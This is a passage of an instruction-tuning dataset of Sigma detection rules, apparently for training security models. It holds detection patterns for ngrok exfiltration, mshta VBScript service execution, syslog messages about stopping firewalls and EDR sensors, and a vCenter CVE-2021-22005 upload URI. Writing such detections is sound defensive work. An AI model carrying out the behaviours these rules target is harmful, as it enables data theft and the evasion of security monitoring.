    "instruction": "Build a Sigma rule with the goal of detecting many failed connection attempts to different ports or hosts.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect many failed connection attempts to different ports or hosts, you should: focus on analyzing firewall logs to identify patterns of denied actions within a 24-hour timeframe. Specifically, you are looking for instances where more than ten different destination ports are involved in failed connection attempts from the same source IP address. This activity is recorded in the logs with the 'action' field marked as 'denied'. By aggregating this data, specifically counting the number of unique destination ports ('dst_port') associated with each source IP address ('src_ip'), you can identify potential malicious behavior indicative of scanning or enumeration efforts. It is important to monitor these events, as they can signal an attacker attempting to discover open ports or vulnerable hosts within a network. However, be aware that certain legitimate tools, such as inventory systems and vulnerability scans, might also generate similar traffic patterns, which could be mistaken as false positives. The key fields to observe in the logs for this analysis are the source IP ('src_ip'), destination IP ('dst_ip'), and destination port ('dst_port'). This monitoring approach is of medium priority and is aligned with identifying behaviors associated with reconnaissance tactics, where attackers attempt to gain information about the network and its hosts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: firewall\ndetection:\n    selection:\n        action: denied\n    timeframe: 24h\n    condition: selection | count(dst_port) by src_ip > 10\nfields:\n    - src_ip\n    - dst_ip\n    - dst_port\nfalsepositives:\n    - Inventarization systems\n    - Vulnerability scans\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: firewall\ndetection:\n    selection:\n        action: denied\n    timeframe: 24h\n    condition: selection | count(dst_port) by src_ip > 10\nfields:\n    - src_ip\n    - dst_ip\n    - dst_port\nfalsepositives:\n    - Inventarization systems\n    - Vulnerability scans\nlevel: medium\n",
      "question": "many failed connection attempts to different ports or hosts",
      "answer": "In order to detect many failed connection attempts to different ports or hosts, you should: focus on analyzing firewall logs to identify patterns of denied actions within a 24-hour timeframe. Specifically, you are looking for instances where more than ten different destination ports are involved in failed connection attempts from the same source IP address. This activity is recorded in the logs with the 'action' field marked as 'denied'. By aggregating this data, specifically counting the number of unique destination ports ('dst_port') associated with each source IP address ('src_ip'), you can identify potential malicious behavior indicative of scanning or enumeration efforts. It is important to monitor these events, as they can signal an attacker attempting to discover open ports or vulnerable hosts within a network. However, be aware that certain legitimate tools, such as inventory systems and vulnerability scans, might also generate similar traffic patterns, which could be mistaken as false positives. The key fields to observe in the logs for this analysis are the source IP ('src_ip'), destination IP ('dst_ip'), and destination port ('dst_port'). This monitoring approach is of medium priority and is aligned with identifying behaviors associated with reconnaissance tactics, where attackers attempt to gain information about the network and its hosts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting EFS Fileshare Mount is modified or deleted. An adversary breaking any file system using the mount target that is being deleted, which might disrupt instances or applications using those mounts..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when an EFS Fileshare Mount is modified or deleted, an adversary breaking any file system using the mount target that is being deleted, which might disrupt instances or applications using those mounts, you should: monitor AWS CloudTrail logs for actions related to the Elastic File System (EFS). Specifically, look for log entries where the event source is `elasticfilesystem.amazonaws.com` and the event name matches `DeleteMountTarget`. These logs signify that a mount target within EFS is being deleted. This activity could indicate an attempt by an adversary to disrupt services by removing access to the file system mounts, potentially impacting instances or applications that rely on these mounts for operation. It's worth noting that while some deletions may be legitimate administrative actions, unexpected or unauthorized deletions should be treated with caution, and the context should be investigated. As this detection has a medium level of significance, it suggests that while not all deletions may be malicious, they merit scrutiny to ensure they are not part of a larger, potentially harmful, action against the file system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: elasticfilesystem.amazonaws.com\n        eventName: DeleteMountTarget\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: elasticfilesystem.amazonaws.com\n        eventName: DeleteMountTarget\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "EFS Fileshare Mount is modified or deleted. An adversary breaking any file system using the mount target that is being deleted, which might disrupt instances or applications using those mounts.",
      "answer": "In order to detect when an EFS Fileshare Mount is modified or deleted, an adversary breaking any file system using the mount target that is being deleted, which might disrupt instances or applications using those mounts, you should: monitor AWS CloudTrail logs for actions related to the Elastic File System (EFS). Specifically, look for log entries where the event source is `elasticfilesystem.amazonaws.com` and the event name matches `DeleteMountTarget`. These logs signify that a mount target within EFS is being deleted. This activity could indicate an attempt by an adversary to disrupt services by removing access to the file system mounts, potentially impacting instances or applications that rely on these mounts for operation. It's worth noting that while some deletions may be legitimate administrative actions, unexpected or unauthorized deletions should be treated with caution, and the context should be investigated. As this detection has a medium level of significance, it suggests that while not all deletions may be malicious, they merit scrutiny to ensure they are not part of a larger, potentially harmful, action against the file system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting an executable accessing ngrok.io, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an executable accessing ngrok.io, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors, you should: Monitor network connections on Windows systems for instances where a connection has been initiated to a destination hostname that ends with '.ngrok.io'. This analysis focuses on detecting potentially malicious activity, given that ngrok.io is commonly used for securely exposing a local web server to the internet, but it can also be leveraged by attackers for data exfiltration purposes. While this behavior may flag legitimate uses of ngrok.io, it is marked with a high level of caution due to the potential for misuse in bypassing network security measures and exfiltrating sensitive information. Therefore, any detection of such activity should be thoroughly investigated for indications of malicious behavior.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Initiated: 'true'\n        DestinationHostname|endswith: '.ngrok.io'\n    condition: selection\nfalsepositives:\n    - Legitimate use of ngrok.io\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Initiated: 'true'\n        DestinationHostname|endswith: '.ngrok.io'\n    condition: selection\nfalsepositives:\n    - Legitimate use of ngrok.io\nlevel: high\n",
      "question": "an executable accessing ngrok.io, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors",
      "answer": "In order to detect an executable accessing ngrok.io, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors, you should: Monitor network connections on Windows systems for instances where a connection has been initiated to a destination hostname that ends with '.ngrok.io'. This analysis focuses on detecting potentially malicious activity, given that ngrok.io is commonly used for securely exposing a local web server to the internet, but it can also be leveraged by attackers for data exfiltration purposes. While this behavior may flag legitimate uses of ngrok.io, it is marked with a high level of caution due to the potential for misuse in bypassing network security measures and exfiltrating sensitive information. Therefore, any detection of such activity should be thoroughly investigated for indications of malicious behavior."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated Powershell via use MSHTA in Scripts.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to Detect Obfuscated Powershell via use MSHTA in Scripts, you should: Monitor Windows system logs for events generated by the Service Control Manager, focusing specifically on event ID 7045. This event signals the creation of a new service, which can be a common tactic used by attackers to execute obfuscated PowerShell commands. Pay particular attention to the 'ImagePath' field within these events. An occurrence is considered suspicious if the 'ImagePath' contains both 'mshta' and 'vbscript:createobject' segments. These elements are indicative of an attempt to leverage the Microsoft HTML Application Host (mshta) to execute VBScript code that, in turn, can create and manipulate objects; this is a method commonly employed to bypass traditional detection mechanisms by obfuscating PowerShell scripts. Although the detection of this activity is set at a high level due to its potential severity, be aware that there might be legitimate use cases that result in false positives. It is important to investigate these occurrences to differentiate between malicious actions and legitimate administrative tasks. The tactics and techniques associated with this behavior include Execution and Command and Scripting Interpreter, underlining its relevance to cybersecurity practices aimed at identifying sophisticated attack methodologies.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ImagePath|contains|all:\n            - 'mshta'\n            - 'vbscript:createobject'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ImagePath|contains|all:\n            - 'mshta'\n            - 'vbscript:createobject'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated Powershell via use MSHTA in Scripts",
      "answer": "In order to Detect Obfuscated Powershell via use MSHTA in Scripts, you should: Monitor Windows system logs for events generated by the Service Control Manager, focusing specifically on event ID 7045. This event signals the creation of a new service, which can be a common tactic used by attackers to execute obfuscated PowerShell commands. Pay particular attention to the 'ImagePath' field within these events. An occurrence is considered suspicious if the 'ImagePath' contains both 'mshta' and 'vbscript:createobject' segments. These elements are indicative of an attempt to leverage the Microsoft HTML Application Host (mshta) to execute VBScript code that, in turn, can create and manipulate objects; this is a method commonly employed to bypass traditional detection mechanisms by obfuscating PowerShell scripts. Although the detection of this activity is set at a high level due to its potential severity, be aware that there might be legitimate use cases that result in false positives. It is important to investigate these occurrences to differentiate between malicious actions and legitimate administrative tasks. The tactics and techniques associated with this behavior include Execution and Command and Scripting Interpreter, underlining its relevance to cybersecurity practices aimed at identifying sophisticated attack methodologies."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation, you should: monitor the creation of processes on Windows systems, specifically looking for instances where a process named 'gbb.exe' is launched by a parent process named 'Hwp.exe'. This specific pattern of process creation is uncommon and could signify an attempt to exploit vulnerabilities associated with the Hangul Word Processor software, often utilized in targeting specific systems or environments. Given the rarity of such activities under normal circumstances, events matching these criteria should be considered with high suspicion, although it's acknowledged that in some rare instances there might be legitimate reasons for this activity, thus potential false positives are noted as \"Unknown\".",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\Hwp.exe'\n        Image|endswith: '\\gbb.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\Hwp.exe'\n        Image|endswith: '\\gbb.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation",
      "answer": "In order to detect suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation, you should: monitor the creation of processes on Windows systems, specifically looking for instances where a process named 'gbb.exe' is launched by a parent process named 'Hwp.exe'. This specific pattern of process creation is uncommon and could signify an attempt to exploit vulnerabilities associated with the Hangul Word Processor software, often utilized in targeting specific systems or environments. Given the rarity of such activities under normal circumstances, events matching these criteria should be considered with high suspicion, although it's acknowledged that in some rare instances there might be legitimate reasons for this activity, thus potential false positives are noted as \"Unknown\"."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting modification of the findings on SecurityHub..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the modification of the findings on SecurityHub, you should monitor for specific events within AWS CloudTrail logs, focusing on activities related to SecurityHub. Look for interactions whereby someone is attempting to manipulate findings by using actions such as 'BatchUpdateFindings', 'DeleteInsight', 'UpdateFindings', or 'UpdateInsight'. These actions could indicate an attempt to alter the detection of suspicious activities or the deletion of insights, potentially obscuring or modifying the visibility of threats within the environment. The primary source of information will be the event source from securityhub.amazonaws.com, and it's crucial to pay attention to the IP address initiating the action (sourceIPAddress) and the user identity (userIdentity.arn) involved in these events. Be cautious of false positives, which can arise from routine behaviors by system or network administrators, especially when these actions are carried out in development, user acceptance testing (UAT), or system integration testing (SAT) environments. This rule is particularly important in production environments where unauthorized modification of findings could have significant implications. The severity of this rule is considered high due to the potential impact on security operations and risk management processes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: securityhub.amazonaws.com\n        eventName:\n            - 'BatchUpdateFindings'\n            - 'DeleteInsight'\n            - 'UpdateFindings'\n            - 'UpdateInsight'\n    condition: selection\nfields:\n    - sourceIPAddress\n    - userIdentity.arn\nfalsepositives:\n    - System or Network administrator behaviors\n    - DEV, UAT, SAT environment. You should apply this rule with PROD environment only.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: securityhub.amazonaws.com\n        eventName:\n            - 'BatchUpdateFindings'\n            - 'DeleteInsight'\n            - 'UpdateFindings'\n            - 'UpdateInsight'\n    condition: selection\nfields:\n    - sourceIPAddress\n    - userIdentity.arn\nfalsepositives:\n    - System or Network administrator behaviors\n    - DEV, UAT, SAT environment. You should apply this rule with PROD environment only.\nlevel: high\n",
      "question": "modification of the findings on SecurityHub.",
      "answer": "In order to detect the modification of the findings on SecurityHub, you should monitor for specific events within AWS CloudTrail logs, focusing on activities related to SecurityHub. Look for interactions whereby someone is attempting to manipulate findings by using actions such as 'BatchUpdateFindings', 'DeleteInsight', 'UpdateFindings', or 'UpdateInsight'. These actions could indicate an attempt to alter the detection of suspicious activities or the deletion of insights, potentially obscuring or modifying the visibility of threats within the environment. The primary source of information will be the event source from securityhub.amazonaws.com, and it's crucial to pay attention to the IP address initiating the action (sourceIPAddress) and the user identity (userIdentity.arn) involved in these events. Be cautious of false positives, which can arise from routine behaviors by system or network administrators, especially when these actions are carried out in development, user acceptance testing (UAT), or system integration testing (SAT) environments. This rule is particularly important in production environments where unauthorized modification of findings could have significant implications. The severity of this rule is considered high due to the potential impact on security operations and risk management processes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of the LiveKD driver, which is used for live kernel debugging.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of the LiveKD driver, which is used for live kernel debugging, you should: Focus on monitoring file events in Windows environments, specifically watching for the creation of a file named \"C:\\Windows\\System32\\drivers\\LiveKdD.SYS.\" Additionally, the execution of processes that end with '\\livekd.exe' or '\\livek64.exe' should be tracked. This is crucial because such activities are indicators of the use of LiveKD, a tool designed for live kernel debugging. Be aware that genuine debugging efforts using LiveKD will also match these criteria, therefore, such legitimate usage should be considered as potential false positives. This monitoring is categorized under a medium severity level due to its potential implications for live kernel debugging activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename: 'C:\\Windows\\System32\\drivers\\LiveKdD.SYS'\n        Image|endswith:\n            - '\\livekd.exe'\n            - '\\livek64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of LiveKD for debugging purposes will also trigger this\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename: 'C:\\Windows\\System32\\drivers\\LiveKdD.SYS'\n        Image|endswith:\n            - '\\livekd.exe'\n            - '\\livek64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of LiveKD for debugging purposes will also trigger this\nlevel: medium\n",
      "question": "creation of the LiveKD driver, which is used for live kernel debugging",
      "answer": "In order to detect the creation of the LiveKD driver, which is used for live kernel debugging, you should: Focus on monitoring file events in Windows environments, specifically watching for the creation of a file named \"C:\\Windows\\System32\\drivers\\LiveKdD.SYS.\" Additionally, the execution of processes that end with '\\livekd.exe' or '\\livek64.exe' should be tracked. This is crucial because such activities are indicators of the use of LiveKD, a tool designed for live kernel debugging. Be aware that genuine debugging efforts using LiveKD will also match these criteria, therefore, such legitimate usage should be considered as potential false positives. This monitoring is categorized under a medium severity level due to its potential implications for live kernel debugging activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting disabling security tools.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect disabling security tools, you should monitor Linux system logs, specifically focusing on syslog entries. Key indicators of this type of activity include log entries that contain phrases like \"stopping iptables,\" \"stopping ip6tables,\" \"stopping firewalld,\" \"stopping cbdaemon,\" and \"stopping falcon-sensor.\" These entries suggest actions that could disable vital security components on a Linux system, potentially making it more vulnerable to attacks. It is important to note, however, that there could be legitimate reasons for these actions, such as during routine administration tasks, so not every instance identified might indicate a security threat. The severity of these findings is considered medium, indicating that while this activity can be a serious security concern, context is key to understanding the risk it poses.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: syslog\ndetection:\n    keywords:\n        - 'stopping iptables'\n        - 'stopping ip6tables'\n        - 'stopping firewalld'\n        - 'stopping cbdaemon'\n        - 'stopping falcon-sensor'\n    condition: keywords\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: syslog\ndetection:\n    keywords:\n        - 'stopping iptables'\n        - 'stopping ip6tables'\n        - 'stopping firewalld'\n        - 'stopping cbdaemon'\n        - 'stopping falcon-sensor'\n    condition: keywords\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n",
      "question": "disabling security tools",
      "answer": "In order to detect disabling security tools, you should monitor Linux system logs, specifically focusing on syslog entries. Key indicators of this type of activity include log entries that contain phrases like \"stopping iptables,\" \"stopping ip6tables,\" \"stopping firewalld,\" \"stopping cbdaemon,\" and \"stopping falcon-sensor.\" These entries suggest actions that could disable vital security components on a Linux system, potentially making it more vulnerable to attacks. It is important to note, however, that there could be legitimate reasons for these actions, such as during routine administration tasks, so not every instance identified might indicate a security threat. The severity of these findings is considered medium, indicating that while this activity can be a serious security concern, context is key to understanding the risk it poses."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting PowerShell creating a PowerShell file (.ps1). While often times this behavior is benign, sometimes it can be a sign of a dropper script trying to achieve persistence..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect PowerShell creating a PowerShell file (.ps1), which might indicate benign activity or potentially a dropper script trying to achieve persistence, you should focus on monitoring file events on Windows systems. Specifically, keep an eye out for instances where 'powershell.exe' or 'pwsh.exe' results in the creation of '.ps1' files. This behavior can be captured by evaluating file event logs for occurrences where the image path ends with either '\\powershell.exe' or '\\pwsh.exe' and the target filename ends with '.ps1'. However, it's important to exclude certain cases to reduce false positives: ignore any instances where the target filename contains '__PSScriptPolicyTest_', starts with 'C:\\Users\\' and contains '\\AppData\\Local\\Temp\\', or begins with 'C:\\Windows\\Temp\\'. Keep in mind that the exact nature of false positives may vary based on the environment and the PowerShell scripts being utilized. It may be necessary to apply additional filters based on the specific context to accurately identify suspicious activity without overwhelming the system with benign triggers. This approach aims at striking a balance between vigilance against potential threats and minimizing the noise from false alarms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        TargetFilename|endswith: '.ps1'\n    filter_main_psscriptpolicytest:\n        TargetFilename|contains: '__PSScriptPolicyTest_'\n    filter_main_appdata:\n        TargetFilename|startswith: 'C:\\Users\\'\n        TargetFilename|contains: '\\AppData\\Local\\Temp\\'\n    filter_main_windows_temp:\n        TargetFilename|startswith: 'C:\\Windows\\Temp\\'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - False positives will differ depending on the environement and scripts used. Apply additional filters accordingly.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        TargetFilename|endswith: '.ps1'\n    filter_main_psscriptpolicytest:\n        TargetFilename|contains: '__PSScriptPolicyTest_'\n    filter_main_appdata:\n        TargetFilename|startswith: 'C:\\Users\\'\n        TargetFilename|contains: '\\AppData\\Local\\Temp\\'\n    filter_main_windows_temp:\n        TargetFilename|startswith: 'C:\\Windows\\Temp\\'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - False positives will differ depending on the environement and scripts used. Apply additional filters accordingly.\nlevel: low\n",
      "question": "PowerShell creating a PowerShell file (.ps1). While often times this behavior is benign, sometimes it can be a sign of a dropper script trying to achieve persistence.",
      "answer": "In order to detect PowerShell creating a PowerShell file (.ps1), which might indicate benign activity or potentially a dropper script trying to achieve persistence, you should focus on monitoring file events on Windows systems. Specifically, keep an eye out for instances where 'powershell.exe' or 'pwsh.exe' results in the creation of '.ps1' files. This behavior can be captured by evaluating file event logs for occurrences where the image path ends with either '\\powershell.exe' or '\\pwsh.exe' and the target filename ends with '.ps1'. However, it's important to exclude certain cases to reduce false positives: ignore any instances where the target filename contains '__PSScriptPolicyTest_', starts with 'C:\\Users\\' and contains '\\AppData\\Local\\Temp\\', or begins with 'C:\\Windows\\Temp\\'. Keep in mind that the exact nature of false positives may vary based on the environment and the PowerShell scripts being utilized. It may be necessary to apply additional filters based on the specific context to accurately identify suspicious activity without overwhelming the system with benign triggers. This approach aims at striking a balance between vigilance against potential threats and minimizing the noise from false alarms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation attempts using file upload vulnerability CVE-2021-22005 in the VMWare vCenter Server..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation attempts using file upload vulnerability CVE-2021-22005 in the VMWare vCenter Server, you should: Monitor your web server logs for POST requests containing the specific query '/analytics/telemetry/ph/api/hyper/send?' in the URI. These types of requests could indicate an attempt to exploit the file upload vulnerability present in the VMWare vCenter Server, as identified by CVE-2021-22005. Be aware that receiving alerts on such patterns does not always mean an attack is successful; sometimes, vulnerability scanning activities can trigger these alerts, marking them as false positives. However, due to the high risk associated with this vulnerability, any detection should be treated with caution and investigated promptly.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        cs-method: 'POST'\n        cs-uri-query|contains: '/analytics/telemetry/ph/api/hyper/send?'\n    condition: selection\nfalsepositives:\n    - Vulnerability Scanning\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection:\n        cs-method: 'POST'\n        cs-uri-query|contains: '/analytics/telemetry/ph/api/hyper/send?'\n    condition: selection\nfalsepositives:\n    - Vulnerability Scanning\nlevel: high\n",
      "question": "exploitation attempts using file upload vulnerability CVE-2021-22005 in the VMWare vCenter Server.",
      "answer": "In order to detect exploitation attempts using file upload vulnerability CVE-2021-22005 in the VMWare vCenter Server, you should: Monitor your web server logs for POST requests containing the specific query '/analytics/telemetry/ph/api/hyper/send?' in the URI. These types of requests could indicate an attempt to exploit the file upload vulnerability present in the VMWare vCenter Server, as identified by CVE-2021-22005. Be aware that receiving alerts on such patterns does not always mean an attack is successful; sometimes, vulnerability scanning activities can trigger these alerts, marking them as false positives. However, due to the high risk associated with this vulnerability, any detection should be treated with caution and investigated promptly."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when an admin share is mounted using net.exe.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when an admin share is mounted using net.exe, you should focus on monitoring process creation events within Windows environments. Specifically, pay attention to instances where either 'net.exe' or 'net1.exe' are executed, as these are command-line utilities often leveraged for network tasks, including the mounting of administrator shares. The detection is based on two main criteria: the name of the executable (where it ends with '\\net.exe' or '\\net1.exe') and the command line arguments that include 'use' in conjunction with a pattern that matches a Universal Naming Convention (UNC) path to an admin share (indicated by '\\\\\\\\*\\\\*$'). It's important to note that while this kind of activity can sometimes be legitimate and performed by administrators, it might also indicate a potential security threat, such as an attacker trying to gain unauthorized access to admin shares. Therefore, any detection at a medium level of confidence should be investigated, keeping in mind that legitimate administrative activities could also trigger this alert.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' use '\n            - ' \\\\\\\\*\\\\*$'\n    condition: all of selection_*\nfalsepositives:\n    - Administrators\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' use '\n            - ' \\\\\\\\*\\\\*$'\n    condition: all of selection_*\nfalsepositives:\n    - Administrators\nlevel: medium\n",
      "question": "when an admin share is mounted using net.exe",
      "answer": "In order to detect when an admin share is mounted using net.exe, you should focus on monitoring process creation events within Windows environments. Specifically, pay attention to instances where either 'net.exe' or 'net1.exe' are executed, as these are command-line utilities often leveraged for network tasks, including the mounting of administrator shares. The detection is based on two main criteria: the name of the executable (where it ends with '\\net.exe' or '\\net1.exe') and the command line arguments that include 'use' in conjunction with a pattern that matches a Universal Naming Convention (UNC) path to an admin share (indicated by '\\\\\\\\*\\\\*$'). It's important to note that while this kind of activity can sometimes be legitimate and performed by administrators, it might also indicate a potential security threat, such as an attacker trying to gain unauthorized access to admin shares. Therefore, any detection at a medium level of confidence should be investigated, keeping in mind that legitimate administrative activities could also trigger this alert."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting code page switch in command line or batch scripts to a rare language.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a code page switch in command line or batch scripts to a rare language, you should: Monitor Windows process creation logs for executions of 'chcp.com' where the command line ends with arguments indicating a switch to less commonly used code pages, specifically Chinese ('936') or Vietnamese ('1258'). It's essential to track the parent command line that initiated this process as it might provide context or evidence of malicious intent. Be aware that while this detection aims to spot unusual activity potentially indicative of an attacker trying to evade detection by leveraging uncommon character sets, legitimate administrative activities may also trigger this alert if code page changes are part of normal operations for users who work with these languages. It's categorized at a medium level of importance, suggesting that while not all detections will be malicious, they warrant investigation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\chcp.com'\n        CommandLine|endswith:\n            - ' 936'    # Chinese\n            # - ' 1256' # Arabic\n            - ' 1258'   # Vietnamese\n            # - ' 855'  # Russian\n            # - ' 866'  # Russian\n            # - ' 864'  # Arabic\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity (adjust code pages according to your organization's region)\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\chcp.com'\n        CommandLine|endswith:\n            - ' 936'    # Chinese\n            # - ' 1256' # Arabic\n            - ' 1258'   # Vietnamese\n            # - ' 855'  # Russian\n            # - ' 866'  # Russian\n            # - ' 864'  # Arabic\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity (adjust code pages according to your organization's region)\nlevel: medium\n",
      "question": "code page switch in command line or batch scripts to a rare language",
      "answer": "In order to detect a code page switch in command line or batch scripts to a rare language, you should: Monitor Windows process creation logs for executions of 'chcp.com' where the command line ends with arguments indicating a switch to less commonly used code pages, specifically Chinese ('936') or Vietnamese ('1258'). It's essential to track the parent command line that initiated this process as it might provide context or evidence of malicious intent. Be aware that while this detection aims to spot unusual activity potentially indicative of an attacker trying to evade detection by leveraging uncommon character sets, legitimate administrative activities may also trigger this alert if code page changes are part of normal operations for users who work with these languages. It's categorized at a medium level of importance, suggesting that while not all detections will be malicious, they warrant investigation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting a suspicious crash of the Microsoft Malware Protection Engine.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious crash of the Microsoft Malware Protection Engine, you should monitor application logs on Windows systems for events generated by the Windows Error Reporting service. Specifically, look for events with a Provider Name of 'Windows Error Reporting' and an EventID of 1001. Crucially, within the data field of these events, ensure that both 'MsMpEng.exe' and 'mpengine.dll' are mentioned. These artifacts are key components of the Microsoft Malware Protection Engine, and their presence in a crash report may indicate a potentially malicious interference or a severe error within the system's protective measures.\n\nHowever, it's significant to acknowledge that not all crashes involving these components are of a malicious origin. For instance, a crash could occur simply because the \"C:\\\" partition on the system is full, which would be a non-malicious, yet critical system issue to resolve. Given the high severity level of this monitoring strategy, it aims to highlight events that could compromise the integrity and reliability of Microsoft's Malware Protection mechanisms, thereby aiding in the swift identification and mitigation of potential threats to the system's security posture.",
    "context": "",
